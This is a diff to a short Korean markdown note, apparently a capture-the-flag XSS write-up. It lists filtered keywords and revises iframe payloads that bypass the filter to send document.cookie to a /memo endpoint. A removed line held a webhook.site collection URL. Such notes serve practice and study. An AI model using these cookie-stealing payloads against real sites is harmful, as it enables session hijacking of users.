@@ -13,9 +13,8 @@
 - 필터링 되는 문자열
 	- `script`, `on`, `javascript`, `window`, `self`, `this`, `document`, `location`, `(`, `)`, `&#`
 
-iframe src=""
-[https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6](https://webhook.site/9c575756-4179-4461-8db6-cbf276d1e0d6)
 
 ```html
-<iframe src='/memo?memo='%2B'docu'%2B'ment'.cookie></iframe>
+<iframe src='/memo?memo='+'docu\tment.cookie'></iframe>
+<iframe src='javascript:location.href='/memo?memo='+document.cookie;"></iframe>
 ```
